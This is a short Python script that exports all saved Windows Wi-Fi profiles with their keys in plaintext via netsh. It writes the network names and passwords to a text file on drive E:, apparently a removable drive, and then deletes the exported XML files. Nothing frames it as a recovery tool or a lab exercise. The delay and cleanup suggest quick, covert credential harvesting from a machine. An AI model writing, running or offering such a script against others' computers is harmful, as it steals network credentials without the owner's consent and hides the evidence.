import glob
import subprocess
import time
import os

time.sleep(4)

os.chdir("E:\\")

subprocess.run("netsh wlan export profile folder=E:\ key=clear")

pass_text = ["<name>", "<keyMaterial>"]

time.sleep(1)

with open("MyPassword.txt", "a") as filtered_file:
    for file_path in glob.glob("*.xml"):
        with open(file_path) as file:
            filtered_lines = [line for line in file if any(keyword in line for keyword in pass_text)]
            for line in filtered_lines:
                filtered_file.write(line)

ext = ".xml"
for filename in os.listdir():
    if filename.endswith(ext):
        os.remove(filename)
